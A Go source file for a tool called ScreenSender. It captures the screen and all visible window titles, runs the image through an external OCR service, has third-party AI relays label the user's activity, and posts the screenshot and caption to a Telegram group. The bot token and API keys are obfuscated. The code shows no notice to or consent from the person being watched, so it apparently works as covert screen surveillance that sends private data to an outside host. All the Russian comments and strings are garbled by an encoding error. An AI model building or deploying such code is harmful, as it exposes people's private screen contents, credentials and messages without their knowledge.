// –§–∞–π–ª: main.go (–§–ò–ù–ê–õ–¨–ù–ê–Ø –í–ï–†–°–ò–Ø –° –£–õ–£–ß–®–ï–ù–ù–´–ú –ü–†–û–ú–ü–¢–û–ú)
package main

import (
	"bytes"
	"encoding/base64"
	"encoding/json"
	"flag"
	"fmt"
	"image/jpeg"
	"io"
	"log"
	"mime/multipart"
	"net/http"
	"strconv"
	"strings"
	"time"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api/v5"
)

// --- –ì–ª–æ–±–∞–ª—å–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ –¥–ª—è ldflags ---
var (
	encryptedToken                string
	encryptedScreenshotTargetInfo string
	encryptedLogTargetInfo        string
	encryptedNavyAIKeys           string
	encryptedElectronHubKeys      string
	encryptedVoidAIKeys           string
	encryptedOcrKeys              string
)

// --- –ö–æ–Ω—Å—Ç–∞–Ω—Ç—ã ---
const encryptionKey = "a-very-secret-key-for-my-app-123"
const (
	MODEL_PRIMARY     = "gpt-4o"
	MODEL_BACKUP      = "gemini-1.5-flash-latest"
	MODEL_LAST_RESORT = "gpt-3.5-turbo"
)
const ocrWordLimit = 25

// --- –°—Ç—Ä—É–∫—Ç—É—Ä—ã ---
type ResponseFormat struct {
	Type string `json:"type"`
}
type APIRequest struct {
	Model          string          `json:"model"`
	Messages       []Message       `json:"messages"`
	MaxTokens      int             `json:"max_tokens"`
	Temperature    float32         `json:"temperature"`
	ResponseFormat *ResponseFormat `json:"response_format,omitempty"`
}
type Message struct {
	Role    string `json:"role"`
	Content string `json:"content"`
}
type APIResponse struct{ Choices []Choice }
type Choice struct{ Message Message }

type AI_Batch_Output struct {
	PrimaryProgram       string `json:"primary_program"`
	UserActivitySentence string `json:"user_activity_sentence"`
	ActivityCategory     string `json:"activity_category"`
}
type Provider struct {
	Name, APIEndpoint, ModelName string
	Keys                         []string
	Priority                     int
}
type OcrResponse struct {
	ParsedResults         []ParsedResult `json:"ParsedResults"`
	OCRExitCode           int            `json:"OCRExitCode"`
	IsErroredOnProcessing bool           `json:"IsErroredOnProcessing"`
	ErrorMessage          string         `json:"ErrorMessage"`
}
type ParsedResult struct {
	ParsedText   string `json:"ParsedText"`
	ErrorMessage string `json:"ErrorMessage"`
	ErrorDetails string `json:"ErrorDetails"`
}

// --- –§—É–Ω–∫—Ü–∏–∏-–æ–±–µ—Ä—Ç–∫–∏ –¥–ª—è –ø–ª–∞—Ç—Ñ–æ—Ä–º–æ-–∑–∞–≤–∏—Å–∏–º–æ–≥–æ –∫–æ–¥–∞ ---
func getScreenshot() ([]byte, error) {
	img, err := captureScreen()
	if err != nil {
		return nil, err
	}
	var buf bytes.Buffer
	err = jpeg.Encode(&buf, img, nil)
	if err != nil {
		return nil, fmt.Errorf("–æ—à–∏–±–∫–∞ –∫–æ–¥–∏—Ä–æ–≤–∞–Ω–∏—è –≤ JPEG: %v", err)
	}
	return buf.Bytes(), nil
}
func getWindowTitles() ([]string, error) {
	return getAllVisibleWindowTitles()
}

// --- –õ–æ–≥–∏–∫–∞ —Ä–∞—Å–ø–æ–∑–Ω–∞–≤–∞–Ω–∏—è —Ç–µ–∫—Å—Ç–∞ ---
func getTextFromImage(imageData []byte, ocrApiKeys []string, logFunc func(string)) (string, error) {
	if len(ocrApiKeys) == 0 || (len(ocrApiKeys) == 1 && ocrApiKeys[0] == "") {
		return "", fmt.Errorf("API –∫–ª—é—á –¥–ª—è OCR –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω")
	}
	url := "https://api.ocr.space/parse/image"
	var lastError error
	for _, apiKey := range ocrApiKeys {
		var requestBody bytes.Buffer
		writer := multipart.NewWriter(&requestBody)
		part, err := writer.CreateFormFile("file", "screenshot.jpg")
		if err != nil {
			lastError = err
			continue
		}
		_, err = io.Copy(part, bytes.NewReader(imageData))
		if err != nil {
			lastError = err
			continue
		}
		writer.WriteField("apikey", apiKey)
		writer.WriteField("language", "rus")
		writer.WriteField("scale", "true")
		writer.Close()
		req, err := http.NewRequest("POST", url, &requestBody)
		if err != nil {
			lastError = err
			continue
		}
		req.Header.Set("Content-Type", writer.FormDataContentType())
		client := &http.Client{Timeout: 45 * time.Second}
		resp, err := client.Do(req)
		if err != nil {
			lastError = err
			continue
		}
		defer resp.Body.Close()
		if resp.StatusCode != http.StatusOK {
			bodyBytes, _ := io.ReadAll(resp.Body)
			lastError = fmt.Errorf("OCR.space API –≤–µ—Ä–Ω—É–ª –æ—à–∏–±–∫—É: %s (—Ç–µ–ª–æ: %s)", resp.Status, string(bodyBytes))
			continue
		}
		var ocrResponse OcrResponse
		if err := json.NewDecoder(resp.Body).Decode(&ocrResponse); err != nil {
			lastError = err
			continue
		}
		if ocrResponse.IsErroredOnProcessing {
			lastError = fmt.Errorf("–æ—à–∏–±–∫–∞ –æ–±—Ä–∞–±–æ—Ç–∫–∏ –≤ OCR.space: %s", ocrResponse.ErrorMessage)
			continue
		}
		if len(ocrResponse.ParsedResults) > 0 && ocrResponse.ParsedResults[0].ParsedText != "" {
			return ocrResponse.ParsedResults[0].ParsedText, nil
		}
	}
	logFunc(fmt.Sprintf("‚ö†Ô∏è OCR: –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å —Ç–µ–∫—Å—Ç —Å –∏–∑–æ–±—Ä–∞–∂–µ–Ω–∏—è: %v", lastError))
	return "", lastError
}

// --- –õ–æ–≥–∏–∫–∞ –∞–Ω–∞–ª–∏–∑–∞ AI —Å 3 –ø–æ–ø—ã—Ç–∫–∞–º–∏ –∏ JSON MODE ---
func analyzeContent(titles []string, truncatedOcrText string, providers []Provider, logFunc func(string)) (*AI_Batch_Output, error) {
	// <<< --- –£–õ–£–ß–®–ï–ù–ù–´–ô –ü–†–û–ú–ü–¢ –î–õ–Ø –ú–ù–û–ì–û–ó–ê–î–ê–ß–ù–û–°–¢–ò --- >>>
	prompt := fmt.Sprintf(`
–¢–´ ‚Äî –≠–ö–°–ü–ï–†–¢-–ê–ù–ê–õ–ò–¢–ò–ö. –¢–≤–æ—è —Ü–µ–ª—å ‚Äî —Ç–æ—á–Ω–æ –æ–ø—Ä–µ–¥–µ–ª–∏—Ç—å –¥–µ—è—Ç–µ–ª—å–Ω–æ—Å—Ç—å –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª—è, –æ—Å–æ–±–µ–Ω–Ω–æ –º–Ω–æ–≥–æ–∑–∞–¥–∞—á–Ω–æ—Å—Ç—å.

–ü–†–ê–í–ò–õ–ê:
1.  –ü–†–ò–û–†–ò–¢–ï–¢: –¢–µ–∫—Å—Ç —Å —ç–∫—Ä–∞–Ω–∞ (OCR) –≤–∞–∂–Ω–µ–µ –∑–∞–≥–æ–ª–æ–≤–∫–æ–≤.
2.  –ú–ù–û–ì–û–ó–ê–î–ê–ß–ù–û–°–¢–¨: –ï—Å–ª–∏ –≤–∏–¥–∏—à—å –æ–¥–Ω–æ–≤—Ä–µ–º–µ–Ω–Ω–æ –∏–≥—Ä—É (–Ω–∞–ø—Ä–∏–º–µ—Ä, Hearthstone, Steam) –ò –ø—Ä–æ–≥—Ä–∞–º–º—É –¥–ª—è –æ–±—â–µ–Ω–∏—è (Meet, Discord, Telegram, Zoom, Skype), –û–ë–™–ï–î–ò–ù–ò –∏—Ö –≤ –æ–ø–∏—Å–∞–Ω–∏–∏.
    - –ü—Ä–∏–º–µ—Ä: "–ò–≥—Ä–∞–µ—Ç –≤ Hearthstone –∏ –æ–±—â–∞–µ—Ç—Å—è –≤ Meet".
3.  –ö–ê–¢–ï–ì–û–†–ò–ó–ê–¶–ò–Ø: –ï—Å–ª–∏ –µ—Å—Ç—å –∏–≥—Ä–∞, –∫–∞—Ç–µ–≥–æ—Ä–∏—è –≤—Å–µ–≥–¥–∞ "–ì–µ–π–º–∏–Ω–≥".

–ó–ê–î–ê–ù–ò–ï: –í–µ—Ä–Ω–∏ JSON-–æ–±—ä–µ–∫—Ç —Å 3 –∫–ª—é—á–∞–º–∏:
- "primary_program": (string) –ù–∞–∑–≤–∞–Ω–∏–µ —Å–∞–º–æ–π –∞–∫—Ç–∏–≤–Ω–æ–π –ø—Ä–æ–≥—Ä–∞–º–º—ã (–∏–≥—Ä–∞ –≤ –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–µ).
- "user_activity_sentence": (string) –û–ø–∏—Å–∞–Ω–∏–µ –∑–∞–¥–∞—á–∏ (–ø—Ä–∏–º–µ—Ä–Ω–æ 5-10 —Å–ª–æ–≤ –Ω–∞ —Ä—É—Å—Å–∫–æ–º).
- "activity_category": (string) –ö–∞—Ç–µ–≥–æ—Ä–∏—è: –†–∞–∑—Ä–∞–±–æ—Ç–∫–∞, –ö–æ–º–º—É–Ω–∏–∫–∞—Ü–∏—è, –î–∏–∑–∞–π–Ω, –í–µ–±-—Å–µ—Ä—Ñ–∏–Ω–≥, –ì–µ–π–º–∏–Ω–≥, –û—Ñ–∏—Å–Ω–∞—è —Ä–∞–±–æ—Ç–∞, –ú—É–ª—å—Ç–∏–º–µ–¥–∏–∞, –°–∏—Å—Ç–µ–º–Ω—ã–µ –∑–∞–¥–∞—á–∏.

–î–ê–ù–ù–´–ï –î–õ–Ø –ê–ù–ê–õ–ò–ó–ê:
1. –ó–∞–≥–æ–ª–æ–≤–∫–∏ –æ–∫–æ–Ω:
%s
2. –¢–µ–∫—Å—Ç —Å —ç–∫—Ä–∞–Ω–∞ (–¥–æ %d —Å–ª–æ–≤):
%s`, strings.Join(titles, "\n"), ocrWordLimit, truncatedOcrText)
	// <<< --- –ö–û–ù–ï–¶ –ù–û–í–û–ì–û –ü–†–û–ú–ü–¢–ê --- >>>

	logFunc(fmt.Sprintf("---\n–î–∞–Ω–Ω—ã–µ –¥–ª—è AI:\n–ó–∞–≥–æ–ª–æ–≤–∫–∏:\n%s\n\n–¢–µ–∫—Å—Ç —Å OCR (—É—Ä–µ–∑–∞–Ω–Ω—ã–π):\n%s\n---", strings.Join(titles, "\n"), truncatedOcrText))

	var bestResult *AI_Batch_Output
	var bestResultPriority int = 99
	var lastError error

	const totalAttempts = 3
	for attempt := 1; attempt <= totalAttempts; attempt++ {
		logFunc(fmt.Sprintf("--- –ù–ê–ß–ê–õ–û –ü–û–ü–´–¢–ö–ò %d –∏–∑ %d ---", attempt, totalAttempts))
		for _, provider := range providers {
			if bestResult != nil && provider.Priority >= bestResultPriority {
				continue
			}
			logFunc(fmt.Sprintf("‚ñ∂Ô∏è –ü—Ä–æ–≤–µ—Ä—è—é –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞: %s", provider.Name))

			if len(provider.Keys) == 0 || (len(provider.Keys) == 1 && provider.Keys[0] == "") {
				logFunc(fmt.Sprintf("üü° %s: –ü—Ä–æ–ø—É—â–µ–Ω–æ, –∫–ª—é—á–∏ –Ω–µ –ø—Ä–µ–¥–æ—Å—Ç–∞–≤–ª–µ–Ω—ã.", provider.Name))
				continue
			}
			for _, key := range provider.Keys {
				payload := APIRequest{
					Model:          provider.ModelName,
					Messages:       []Message{{Role: "user", Content: prompt}},
					MaxTokens:      150,
					Temperature:    0.2,
					ResponseFormat: &ResponseFormat{Type: "json_object"},
				}
				requestBodyBytes, _ := json.Marshal(payload)
				req, _ := http.NewRequest("POST", provider.APIEndpoint, bytes.NewBuffer(requestBodyBytes))
				req.Header.Set("Content-Type", "application/json")
				req.Header.Set("Authorization", "Bearer "+key)
				client := &http.Client{Timeout: 30 * time.Second}
				resp, err := client.Do(req)
				if err != nil {
					lastError = err
					logFunc(fmt.Sprintf("‚ö†Ô∏è %s: –û—à–∏–±–∫–∞ —Å–µ—Ç–∏.", provider.Name))
					break
				}
				if resp.StatusCode >= 400 {
					lastError = fmt.Errorf("—Å—Ç–∞—Ç—É—Å %d", resp.StatusCode)
					logFunc(fmt.Sprintf("‚ö†Ô∏è %s (–°—Ç–∞—Ç—É—Å: %d): –ö–ª—é—á/–∑–∞–ø—Ä–æ—Å –Ω–µ–≤–∞–ª–∏–¥–µ–Ω.", provider.Name, resp.StatusCode))
					resp.Body.Close()
					continue
				}
				bodyBytes, err := io.ReadAll(resp.Body)
				if err != nil {
					lastError = err
					logFunc(fmt.Sprintf("‚ö†Ô∏è %s: –ù–µ —É–¥–∞–ª–æ—Å—å –ø—Ä–æ—á–∏—Ç–∞—Ç—å –æ—Ç–≤–µ—Ç.", provider.Name))
					resp.Body.Close()
					break
				}
				resp.Body.Close()
				logFunc(fmt.Sprintf("RAW –æ—Ç–≤–µ—Ç –æ—Ç AI (%s):\n```json\n%s\n```", provider.Name, string(bodyBytes)))

				var apiResponse APIResponse
				if err := json.Unmarshal(bodyBytes, &apiResponse); err != nil {
					lastError = err
					logFunc(fmt.Sprintf("‚ö†Ô∏è %s: –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å –≤–Ω–µ—à–Ω—é—é —Å—Ç—Ä—É–∫—Ç—É—Ä—É.", provider.Name))
					break
				}
				if len(apiResponse.Choices) == 0 || apiResponse.Choices[0].Message.Content == "" {
					lastError = fmt.Errorf("–ø—É—Å—Ç–æ–π content")
					logFunc(fmt.Sprintf("‚ö†Ô∏è %s: –ü—É—Å—Ç–æ–π –æ—Ç–≤–µ—Ç.", provider.Name))
					break
				}

				aiContentString := apiResponse.Choices[0].Message.Content
				var finalOutput AI_Batch_Output
				if err = json.Unmarshal([]byte(aiContentString), &finalOutput); err != nil {
					lastError = err
					logFunc(fmt.Sprintf("‚ö†Ô∏è %s: –ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å JSON –∏–∑ 'content'.", provider.Name))
					break
				}

				logFunc(fmt.Sprintf("‚úÖ –£—Å–ø–µ—à–Ω–æ! –ü—Ä–æ–º–µ–∂—É—Ç–æ—á–Ω—ã–π —Ä–µ–∑—É–ª—å—Ç–∞—Ç –ø–æ–ª—É—á–µ–Ω –æ—Ç %s.", provider.Name))
				bestResult = &finalOutput
				bestResultPriority = provider.Priority
				goto nextProvider
			}
		nextProvider:
		}
		if bestResult != nil && bestResultPriority == 0 {
			logFunc("üèÜ –ü–æ–ª—É—á–µ–Ω —Ä–µ–∑—É–ª—å—Ç–∞—Ç –æ—Ç –ø—Ä–∏–æ—Ä–∏—Ç–µ—Ç–Ω–æ–≥–æ –ø—Ä–æ–≤–∞–π–¥–µ—Ä–∞ NavyAI. –ó–∞–≤–µ—Ä—à–∞–µ–º –ø–æ–ø—ã—Ç–∫–∏.")
			break
		}
		if attempt < totalAttempts {
			logFunc(fmt.Sprintf("--- –ö–û–ù–ï–¶ –ü–û–ü–´–¢–ö–ò %d. –ü–∞—É–∑–∞ 30 —Å–µ–∫—É–Ω–¥. ---", attempt))
			time.Sleep(30 * time.Second)
		}
	}
	if bestResult != nil {
		return bestResult, nil
	}
	logFunc("‚ùå –í—Å–µ 3 –ø–æ–ø—ã—Ç–∫–∏ –ø—Ä–æ–≤–∞–ª–∏–ª–∏—Å—å. –ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∞–Ω–∞–ª–∏–∑.")
	return nil, lastError
}

// --- –í—Å–ø–æ–º–æ–≥–∞—Ç–µ–ª—å–Ω—ã–µ —Ñ—É–Ω–∫—Ü–∏–∏ ---
func truncateTextByWords(text string, limit int) string {
	words := strings.Fields(text)
	if len(words) <= limit {
		return text
	}
	return strings.Join(words[:limit], " ")
}
func xorCipher(data []byte, key string) []byte {
	keyBytes := []byte(key)
	keyLen := len(keyBytes)
	result := make([]byte, len(data))
	for i := 0; i < len(data); i++ {
		result[i] = data[i] ^ keyBytes[i%keyLen]
	}
	return result
}

// --- –õ–æ–≥–∏–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ –≤ Telegram ---
func sendLog(botToken, logTargetInfo, errorMessage string) {
	if botToken == "" || logTargetInfo == "" {
		return
	}
	parts := strings.Split(logTargetInfo, ":")
	if len(parts) != 2 {
		return
	}
	groupID, errGroup := strconv.ParseInt(parts[0], 10, 64)
	topicID, errTopic := strconv.Atoi(parts[1])
	if errGroup != nil || errTopic != nil {
		return
	}
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		return
	}
	fullMessage := fmt.Sprintf("üìù –õ–æ–≥ ScreenSender:\n\n%s", errorMessage)
	msg := tgbotapi.NewMessage(groupID, fullMessage)
	msg.ReplyToMessageID = topicID
	bot.Send(msg)
}
func processAndSendScreenshot(photoData []byte, windowTitles []string, botToken, screenshotTargetInfo string, providers []Provider, ocrKeys []string, logFunc func(string)) {
	if botToken == "" || screenshotTargetInfo == "" {
		logFunc("–¢–æ–∫–µ–Ω –∏–ª–∏ ID –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤ –ø—É—Å—Ç—ã–µ.")
		return
	}
	ocrText, _ := getTextFromImage(photoData, ocrKeys, logFunc)
	truncatedOcrText := truncateTextByWords(ocrText, ocrWordLimit)
	analysisResult, err := analyzeContent(windowTitles, truncatedOcrText, providers, logFunc)
	var caption string
	if err != nil || analysisResult == nil {
		caption = "–ê–∫—Ç–∏–≤–Ω–æ—Å—Ç—å –Ω–µ –æ–ø—Ä–µ–¥–µ–ª–µ–Ω–∞"
	} else {
		caption = analysisResult.UserActivitySentence
	}
	parts := strings.Split(screenshotTargetInfo, ":")
	if len(parts) != 2 {
		logFunc(fmt.Sprintf("–ù–µ–≤–µ—Ä–Ω—ã–π —Ñ–æ—Ä–º–∞—Ç ID –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤: %s", screenshotTargetInfo))
		return
	}
	groupID, errGroup := strconv.ParseInt(parts[0], 10, 64)
	topicID, errTopic := strconv.Atoi(parts[1])
	if errGroup != nil || errTopic != nil {
		logFunc("–ù–µ —É–¥–∞–ª–æ—Å—å —Ä–∞—Å–ø–∞—Ä—Å–∏—Ç—å ID –¥–ª—è —Å–∫—Ä–∏–Ω—à–æ—Ç–æ–≤.")
		return
	}
	bot, err := tgbotapi.NewBotAPI(botToken)
	if err != nil {
		logFunc(fmt.Sprintf("–û—à–∏–±–∫–∞ –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –±–æ—Ç–∞: %v", err))
		return
	}
	file := tgbotapi.FileBytes{Name: "screenshot.jpg", Bytes: photoData}
	msg := tgbotapi.NewPhoto(groupID, file)
	msg.Caption = caption
	msg.ReplyToMessageID = topicID
	if _, err := bot.Send(msg); err != nil {
		logFunc(fmt.Sprintf("–û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏ —Å–∫—Ä–∏–Ω—à–æ—Ç–∞: %v", err))
	}
}

// --- –ì–ª–∞–≤–Ω–∞—è —Ñ—É–Ω–∫—Ü–∏—è (–ó–ê–ü–£–°–ö –û–î–ò–ù –†–ê–ó –° –ü–û–ü–´–¢–ö–ê–ú–ò) ---
func main() {
	encryptFlag := flag.String("encrypt", "", "Encrypt a string and print it to stdout")
	flag.Parse()
	if *encryptFlag != "" {
		data := []byte(*encryptFlag)
		encrypted := xorCipher(data, encryptionKey)
		fmt.Print(base64.StdEncoding.EncodeToString(encrypted))
		return
	}

	tokenDecoded, _ := base64.StdEncoding.DecodeString(encryptedToken)
	decryptedToken := string(xorCipher(tokenDecoded, encryptionKey))
	screenshotTargetDecoded, _ := base64.StdEncoding.DecodeString(encryptedScreenshotTargetInfo)
	decryptedScreenshotTarget := string(xorCipher(screenshotTargetDecoded, encryptionKey))
	logTargetDecoded, _ := base64.StdEncoding.DecodeString(encryptedLogTargetInfo)
	decryptedLogTarget := string(xorCipher(logTargetDecoded, encryptionKey))
	ocrKeysDecoded, _ := base64.StdEncoding.DecodeString(encryptedOcrKeys)
	ocrKeysDecrypted := string(xorCipher(ocrKeysDecoded, encryptionKey))
	ocrApiKeys := strings.Split(ocrKeysDecrypted, ",")

	decryptAndSplit := func(encrypted string) []string {
		if encrypted == "" {
			return []string{}
		}
		decoded, err := base64.StdEncoding.DecodeString(encrypted)
		if err != nil {
			return []string{}
		}
		decrypted := string(xorCipher(decoded, encryptionKey))
		if decrypted == "" {
			return []string{}
		}
		return strings.Split(decrypted, ",")
	}
	providers := []Provider{
		{Name: "NavyAI (Primary)", APIEndpoint: "https://api.navy/v1/chat/completions", Keys: decryptAndSplit(encryptedNavyAIKeys), ModelName: MODEL_PRIMARY, Priority: 0},
		{Name: "ElectronHub (Backup)", APIEndpoint: "https://api.electronhub.ai/v1/chat/completions", Keys: decryptAndSplit(encryptedElectronHubKeys), ModelName: MODEL_BACKUP, Priority: 1},
		{Name: "VoidAI (Last Resort)", APIEndpoint: "https://api.voidai.app/v1/chat/completions", Keys: decryptAndSplit(encryptedVoidAIKeys), ModelName: MODEL_LAST_RESORT, Priority: 2},
	}

	logAndSend := func(errMsg string) {
		log.Println(errMsg)
		sendLog(decryptedToken, decryptedLogTarget, errMsg)
	}

	logAndSend("üöÄ ScreenSender –∑–∞–ø—É—â–µ–Ω (—Ä–µ–∂–∏–º 3 –ø–æ–ø—ã—Ç–æ–∫, JSON Mode).")
	screenshotBytes, err := getScreenshot()
	if err != nil {
		logAndSend(fmt.Sprintf("–ù–µ —É–¥–∞–ª–æ—Å—å —Å–¥–µ–ª–∞—Ç—å —Å–∫—Ä–∏–Ω—à–æ—Ç: %v", err))
		return
	}
	titles, err := getWindowTitles()
	if err != nil {
		logAndSend(fmt.Sprintf("–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å –∑–∞–≥–æ–ª–æ–≤–∫–∏ –æ–∫–æ–Ω: %v", err))
		titles = []string{}
	}

	processAndSendScreenshot(screenshotBytes, titles, decryptedToken, decryptedScreenshotTarget, providers, ocrApiKeys, logAndSend)

	logAndSend("‚úÖ –ó–∞–¥–∞—á–∞ –≤—ã–ø–æ–ª–Ω–µ–Ω–∞. –ü—Ä–æ–≥—Ä–∞–º–º–∞ –∑–∞–≤–µ—Ä—à–∞–µ—Ç —Ä–∞–±–æ—Ç—É.")
}
